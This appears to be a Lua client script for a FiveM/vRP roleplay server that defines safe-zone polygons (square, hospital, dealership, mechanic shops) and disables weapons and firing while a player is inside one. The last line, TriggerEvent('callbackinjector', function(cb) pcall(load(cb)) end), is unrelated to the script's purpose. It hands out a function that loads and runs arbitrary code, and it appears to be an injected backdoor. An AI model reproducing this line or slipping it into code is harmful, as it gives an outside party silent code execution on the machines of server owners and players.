-- DEFAULT --
local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")

vRP = Proxy.getInterface("vRP")
SFzone = {}
Tunnel.bindInterface("b2k-safezone", SFzone)

SFServer = Tunnel.getInterface("b2k-safezone")

local fields = {
	{ name = "Praça", edges = {
			{ name = "1_1", x = 304.51, y = -848.86, z = 29.13 },
			{ name = "1_2", x = 234.02, y = -1063.06, z = 29.13 },
			{ name = "1_3", x = 86.89, y = -1014.37, z = 29.22 },
			{ name = "1_4", x = 162.98, y = -800.23, z = 31.05 },
		}
	},
    { name = "Hospital", edges = {
        { name = "2_1", x = -466.18, y = -353.92, z = 34.36 },
        { name = "2_2", x = -460.16, y = -325.76, z = 34.51 },
        { name = "2_3", x = -445.82, y = -328.61, z = 34.51 },
        { name = "2_4", x = -451.6, y = -353.47, z = 34.51 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -467.58, y = -351.92, z = 34.37 },
        { name = "2_2", x = -483.16, y = -349.56, z = 34.51 },
        { name = "2_3", x = -479.51, y = -323.72, z = 34.39 },
        { name = "2_4", x = -461.58, y = -326.28, z = 34.51 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -484.13, y = -325.59, z = 34.51 },
        { name = "2_2", x = -486.43, y = -348.36, z = 34.51 },
        { name = "2_3", x = -500.06, y = -345.86, z = 34.51 },
        { name = "2_4", x = -495.7, y = -325.06, z = 34.51 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -444.48, y = -327.8, z = 34.63 },
        { name = "2_2", x = -432.67, y = -328.94, z = 34.92 },
        { name = "2_3", x = -434.94, y = -357.6, z = 34.92 },
        { name = "2_4", x = -447.99, y = -354.6, z = 34.51 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -442.35, y = -318.62, z = 34.92 },
        { name = "2_2", x = -446.67, y = -320.05, z = 34.92 },
        { name = "2_3", x = -457.98, y = -290.29, z = 34.92 },
        { name = "2_4", x = -454.82, y = -288.37, z = 34.92 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -468.28, y = -292.94, z = 34.92 },
        { name = "2_2", x = -472.03, y = -284.07, z = 36.08 },
        { name = "2_3", x = -453.06, y = -276.79, z = 34.92 },
        { name = "2_4", x = -445.61, y = -283.63, z = 34.92 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -435.06, y = -326.08, z = 34.92 },
        { name = "2_2", x = -445.21, y = -329.43, z = 34.51 },
        { name = "2_3", x = -446.44, y = -320.36, z = 34.92 },
        { name = "2_4", x = -439.03, y = -318.95, z = 34.91 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -442.97, y = -326.89, z = 34.78 },
        { name = "2_2", x = -446.62, y = -354.97, z = 34.51 },
        { name = "2_3", x = -452.47, y = -353.54, z = 34.96 },
        { name = "2_4", x = -448.75, y = -327.84, z = 34.51 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -439.6, y = -357.06, z = 34.49 },
        { name = "2_2", x = -436.34, y = -349.19, z = 34.92 },
        { name = "2_3", x = -446.57, y = -349.06, z = 34.5 },
        { name = "2_4", x = -448.19, y = -355.47, z = 34.51 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -429.54, y = -326.56, z = 35.82 },
        { name = "2_2", x = -439.61, y = -323.13, z = 34.92 },
        { name = "2_3", x = -440.16, y = -321.49, z = 34.92 },
        { name = "2_4", x = -428.31, y = -316.62, z = 34.92 },
    }
},    
    { name = "Hospital", edges = {
        { name = "2_1", x = -431.89, y = -339.99, z = 35.57 },
        { name = "2_2", x = -443.32, y = -337.59, z = 34.92 },
        { name = "2_3", x = -440.52, y = -323.96, z = 34.92 },
        { name = "2_4", x = -432.37, y = -327.07, z = 34.92 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -432.83, y = -330.5, z = 34.92 },
        { name = "2_2", x = -434.56, y = -340.64, z = 34.92 },
        { name = "2_3", x = -432.23, y = -341.21, z = 36.8 },
        { name = "2_4", x = -430.76, y = -331.45, z = 35.31 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -432.07, y = -341.09, z = 36.49 },
        { name = "2_2", x = -434.4, y = -357.84, z = 34.92 },
        { name = "2_3", x = -437.1, y = -360.43, z = 34.96 },
        { name = "2_4", x = -435.59, y = -341.77, z = 34.92 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -449.16, y = -315.81, z = 34.92 },
        { name = "2_2", x = -445.73, y = -326.43, z = 35.85 },
        { name = "2_3", x = -454.6, y = -325.23, z = 34.92 },
        { name = "2_4", x = -456.97, y = -319.63, z = 34.92 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -457.54, y = -318.33, z = 34.92 },
        { name = "2_2", x = -459.51, y = -314.17, z = 35.85 },
        { name = "2_3", x = -451.2, y = -310.98, z = 34.92 },
        { name = "2_4", x = -449.49, y = -315.01, z = 34.92 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -452.68, y = -307.22, z = 34.92 },
        { name = "2_2", x = -460.53, y = -311.22, z = 34.91 },
        { name = "2_3", x = -459.72, y = -313.31, z = 35.68 },
        { name = "2_4", x = -451.72, y = -309.54, z = 35.85 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -454.88, y = -301.8, z = 34.91 },
        { name = "2_2", x = -463.62, y = -305.35, z = 35.94 },
        { name = "2_3", x = -461.95, y = -309.81, z = 35.94 },
        { name = "2_4", x = -452.99, y = -306.41, z = 34.92 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -463.52, y = -304.21, z = 34.92 },
        { name = "2_2", x = -465.23, y = -300.05, z = 35.84 },
        { name = "2_3", x = -457.08, y = -296.44, z = 34.92 },
        { name = "2_4", x = -455.3, y = -300.8, z = 34.92 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -457.45, y = -295.55, z = 34.92 },
        { name = "2_2", x = -464.89, y = -298.62, z = 34.92 },
        { name = "2_3", x = -468.06, y = -294.04, z = 35.85 },
        { name = "2_4", x = -459.58, y = -290.28, z = 34.92 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -453.03, y = -290.53, z = 34.92 },
        { name = "2_2", x = -450.29, y = -297.25, z = 35.62 },
        { name = "2_3", x = -438.32, y = -289.53, z = 35.84 },
        { name = "2_4", x = -444.48, y = -284.56, z = 34.92 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -448.14, y = -302.45, z = 34.92 },
        { name = "2_2", x = -437.64, y = -298.14, z = 34.92 },
        { name = "2_3", x = -439.45, y = -293.82, z = 34.92 },
        { name = "2_4", x = -449.79, y = -298.43, z = 34.92 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -447.8, y = -303.3, z = 34.92 },
        { name = "2_2", x = -445.65, y = -308.54, z = 35.84 },
        { name = "2_3", x = -435.11, y = -304.21, z = 34.92 },
        { name = "2_4", x = -437.29, y = -298.98, z = 34.92 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -443.18, y = -314.78, z = 34.92 },
        { name = "2_2", x = -427.58, y = -308.47, z = 34.92 },
        { name = "2_3", x = -428.19, y = -315.67, z = 34.92 },
        { name = "2_4", x = -440.93, y = -320.0, z = 34.93 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -495.67, y = -336.7, z = 42.33 },
        { name = "2_2", x = -494.27, y = -326.17, z = 42.31 },
        { name = "2_3", x = -478.93, y = -332.11, z = 42.33 },
        { name = "2_4", x = -480.08, y = -339.82, z = 42.33 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -507.44, y = -338.93, z = 42.33 },
        { name = "2_2", x = -506.57, y = -326.54, z = 42.33 },
        { name = "2_3", x = -495.22, y = -326.47, z = 42.33 },
        { name = "2_4", x = -496.75, y = -338.48, z = 42.33 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -515.3, y = -300.45, z = 42.23 },
        { name = "2_2", x = -505.19, y = -296.14, z = 42.23 },
        { name = "2_3", x = -493.25, y = -322.26, z = 42.33 },
        { name = "2_4", x = -506.46, y = -324.97, z = 43.31 },
    }
},
    { name = "Hospital", edges = {
        { name = "2_1", x = -456.6, y = -277.57, z = 34.92 },
        { name = "2_2", x = -453.96, y = -283.77, z = 34.92 },
        { name = "2_3", x = -448.25, y = -281.26, z = 34.92 },
        { name = "2_4", x = -453.51, y = -276.37, z = 36.08 },
    }
},
	{ name = "Concessionaria", edges = {
			{ name = "2_1", x = -34.51, y = -1108.33, z = 26.43 },
			{ name = "2_2", x = -59.85, y = -1098.0, z = 26.43 },
			{ name = "2_3", x = -56.53, y = -1086.73, z = 28.27 },
			{ name = "2_4", x = -31.29, y = -1095.37, z = 26.43 },
		}
	},
	--[[{ name = "Delegacia", edges = {
			{ name = "2_1", x = 388.43649291992, y = -960.86950683594, z = 29.409772872925},
			{ name = "2_2", x = 494.7421875, y = -960.98217773438, z = 27.125974655151 },
			{ name = "2_3", x = 494.59036254883, y = -1025.3571777344, z = 28.151178359985 },
			{ name = "2_4", x = 386.3459777832, y = -1039.0723876953, z = 29.282880783081 },
		}
    },]]
    { name = "Mecanica", edges = {
            { name = "2_1", x = 843.94, y = -2133.44, z = 30.55 },
            { name = "2_2", x = 847.74, y = -2093.59, z = 32.0 },
            { name = "2_3", x = 871.76, y = -2095.0, z = 30.42 },
            { name = "2_4", x = 868.38, y = -2136.11, z = 30.51 },
        }
    },
    { name = "Mecanica", edges = {
            { name = "2_1", x = 870.76, y = -2129.31, z = 30.46 },
            { name = "2_2", x = 873.37, y = -2101.48, z = 30.46 },
            { name = "2_3", x = 891.89, y = -2097.91, z = 30.47 },
            { name = "2_4", x = 891.28, y = -2131.78, z = 30.46 },
        }
    },
    { name = "Mecanica", edges = {
            { name = "2_1", x = 892.99, y = -2097.89, z = 30.47 },
            { name = "2_2", x = 892.96, y = -2132.3, z = 30.46 },
            { name = "2_3", x = 903.59, y = -2133.09, z = 30.46 },
            { name = "2_4", x = 906.3, y = -2098.68, z = 30.46 },
        }
    },
   { name = "MecanicaLS", edges = {
           { name = "2_1", x = 907.79, y = -2099.02, z = 30.47 },
           { name = "2_2", x = 916.47, y = -2099.53, z = 30.46 },
           { name = "2_3", x = 913.71, y = -2133.93, z = 30.46 },
           { name = "2_4", x = 903.53, y = -2133.11, z = 30.46 },
       }
   },
   { name = "MecanicaLS", edges = {
           { name = "2_1", x = -389.06, y = -123.12, z = 38.69},
           { name = "2_2", x = -385.21, y = -130.58, z = 38.69},
           { name = "2_3", x = -380.54, y = -138.54, z = 38.69},
           { name = "2_4", x = -375.9, y = -146.7, z = 38.69 },
       }
   },
   { name = "MecanicaLS", edges = {
           { name = "2_1", x = -371.03, y = -155.36, z = 38.26},
           { name = "2_2", x = -359.65, y = -175.71, z = 37.89 },
           { name = "2_3", x = -359.61, y = -149.31, z = 38.25},
           { name = "2_4", x = -361.16, y = -141.3, z = 38.6 },
       }
   },
   { name = "MecanicaLS", edges = {
           { name = "2_1", x = -365.72, y = -133.97, z = 38.69},
           { name = "2_2", x = -370.51, y = -126.66, z = 38.7 },
           { name = "2_3", x = -376.54, y = -117.64, z = 38.7},
           { name = "2_4", x = -382.85, y = -110.11, z = 38.71 },
       }
   },
   { name = "MecanicaLS", edges = {
           { name = "2_1", x = -387.16, y = -101.3, z = 38.74},
           { name = "2_2", x = -371.84, y = -102.21, z = 38.86 },
           { name = "2_3", x = -359.46, y = -107.33, z = 39.13},
           { name = "2_4", x = -349.26, y = -110.81, z = 39.04 },
       }
   },
   { name = "MecanicaLS", edges = {
           { name = "2_1", x = -316.17, y = -103.97, z = 39.02},
           { name = "2_2", x = -361.98, y = -88.9, z = 39.02 },
           { name = "2_3", x = -327.18, y = -145.39, z = 39.02},
           { name = "2_4", x = -349.26, y = -110.81, z = 39.04 },
       }
   },
   -- { name = "Garagem praca", edges = {
     --       { name = "2_1", x = 242.7424621582, y = -828.58972167969, z = 29.949811935425},
     --       { name = "2_2", x = 190.45768737793, y = -810.41552734375, z = 31.038536071777 },
     --       { name = "2_3", x = 234.80424499512, y = -687.60260009766, z = 36.832145690918 },
     --       { name = "2_4", x = 299.65692138672, y = -701.46496582031, z = 29.306324005127 },
     --   }
  --  },
   -- { name = "Garagem ao lado da praca", edges = {
    --        { name = "2_1", x = 98.363662719727, y = -805.83734130859, z = 31.294855117798},
    --        { name = "2_2", x = 40.099510192871, y = -960.69964599609, z = 29.331689834595 },
    --        { name = "2_3", x = -12.134353637695, y = -942.0068359375, z = 29.252468109131 },
    --      { name = "2_4", x = 43.060272216797, y = -786.54260253906, z = 31.564014434814 },
    --    }
  --  }
    --[[{ name = "Bennys", edges = {
        { name = "2_1", x =-187.25245666504, y = -1293.5069580078, z = 31.295976638794},
        { name = "2_2", x = -186.49954223633, y = -1349.1896972656, z = 31.15832901001 },
        { name = "2_3", x = -248.88511657715, y = -1348.1437988281, z = 31.290096282959 },
        { name = "2_4", x = -250.75230407715, y =-1296.615234375, z = 31.266603469849 },
        }
    }]]
}

--[[ Halloween Event
local isHalloweenEvent = false
RegisterNetEvent("b2k:halloween")
AddEventHandler("b2k:halloween", function(cond)
    local status = false
    if cond == 1 then status = true end

    isHalloweenEvent = status
end)]]

--[[
    FIELD DETECTION
]]
-- Checks if point is within a triange. https://stackoverflow.com/questions/2049582/how-to-determine-if-a-point-is-in-a-2d-triangle
function isPointInTriangle(p, p0, p1, p2)
    local A = 1/2 * (-p1.y * p2.x + p0.y * (-p1.x + p2.x) + p0.x * (p1.y - p2.y) + p1.x * p2.y)
    local sign = 1
    if A < 0 then sign = -1 end
    local s = (p0.y * p2.x - p0.x * p2.y + (p2.y - p0.y) * p.x + (p0.x - p2.x) * p.y) * sign
    local t = (p0.x * p1.y - p0.y * p1.x + (p0.y - p1.y) * p.x + (p1.x - p0.x) * p.y) * sign
    
    return s > 0 and t > 0 and (s + t) < 2 * A * sign
end

function runOnFieldTriangles(field, cb)
    local edges = field.edges
    local num = #edges - 2
    local c = 1
    repeat 
        cb(edges[1], edges[c+1], edges[c+2])
        c = c + 1
    until c > num
end

-- Checks if a point is within a Field structure
function isPointInField(p, field)
    local edges = field.edges
    local within = false
    runOnFieldTriangles(field, function(p0,p1,p2)
        if isPointInTriangle(p, p0, p1, p2) then within = true end
    end)
    return within
end

function GetAreaOfField(field)
    local edges = field.edges
    return math.floor(getAreaOfTriangle(edges[1], edges[2], edges[3]) + getAreaOfTriangle(edges[1], edges[4], edges[3]))
end

function getAreaOfTriangle(p0, p1, p2)
    local b = GetDistanceBetweenCoords(p0.x, p0.y, 0, p1.x, p1.y, 0)
    local h = GetDistanceBetweenCoords(p2.x, p2.y, 0, p1.x, p1.y, 0)
    return (b * h) / 2
end

function debugDrawFieldMarkers(field, r, g, b, a)
    local v = field
    runOnFieldTriangles(v, function(p0,p1,p2) 
        DrawLine(p0.x, p0.y, p0.z + 3.0,
                 p1.x, p1.y, p1.z + 3.0,
            r or 255, g or 0, b or 0, a or 105)
        DrawLine(p2.x, p2.y, p2.z + 3.0,
                 p1.x, p1.y, p1.z + 3.0,
            r or 255, g or 0, b or 0, a or 105)
        DrawLine(p2.x, p2.y, p2.z + 3.0,
                 p0.x, p0.y, p0.z + 3.0,
            r or 255, g or 0, b or 0, a or 105)
    end)
end

function drawText(text)
    if text == "" then return end
    Citizen.InvokeNative(0xB87A37EEB7FAA67D,"STRING")
    AddTextComponentString(text .. "~n~~n~~n~")
    Citizen.InvokeNative(0x9D77056A530643F6, 200, true)
end

local isInSafezone = false

-- Main Thread
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1500)
		local ply = PlayerPedId()
		local pos = GetEntityCoords(ply)
        if IsPedInAnyVehicle(ply) then
            pos = GetEntityCoords(GetVehiclePedIsIn(ply, false))
        end

        --if not isHalloweenEvent then
        isInSafezone = false
        for k,v in next, fields do
            if GetDistanceBetweenCoords(v.edges[1].x, v.edges[1].y,0,pos.x,pos.y,0) <= 500.0 then
                if isPointInField(pos, v) then
                    isInSafezone = true
                --else
                --	isInSafezone = false
                    --NetworkSetFriendlyFireOption(true)
                    --debugDrawFieldMarkers(v)
                end
            end
        end
        --end
    end
end)

Citizen.CreateThread(function()
	while true do
        local perseu = 1000
        if isInSafezone then
            --debugDrawFieldMarkers(v,0,255)
           perseu = 5
		   --drawText("~w~Voce esta em uma ~g~Safezone~w~!")
            ClearPlayerWantedLevel(PlayerId())
            SetCurrentPedWeapon(PlayerPedId(), GetHashKey("WEAPON_UNARMED"), true)
            --NetworkSetFriendlyFireOption(false)
            DisableControlAction(2, 37,  true) -- disable weapon wheel (Tab)
            DisableControlAction(1, 45,  true) -- disable reload
            DisableControlAction(2, 80,  true) -- disable reload
            DisableControlAction(2, 140, true) -- disable reload
            DisableControlAction(2, 250, true) -- disable reload
            DisableControlAction(2, 263, true) -- disable reload
            DisableControlAction(2, 310, true) -- disable reload
            DisableControlAction(1, 140, true)
            DisableControlAction(1, 141, true)
            DisableControlAction(1, 142, true)
            DisableControlAction(1, 143, true)
            DisableControlAction(0, 24,  true) -- disable attack
            DisableControlAction(0, 25,  true) -- disable aim
            --DisableControlAction(0, 47,  true) -- disable weapon
            DisableControlAction(0, 58,  true) -- disable weapon

            DisablePlayerFiring(PlayerPedId(), true) -- Disables firing all together if they somehow bypass inzone Mouse Disable
            DisableControlAction(0, 106, true) -- Disable in-game mouse controls
        end
		Citizen.Wait(perseu)
    end
end)

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)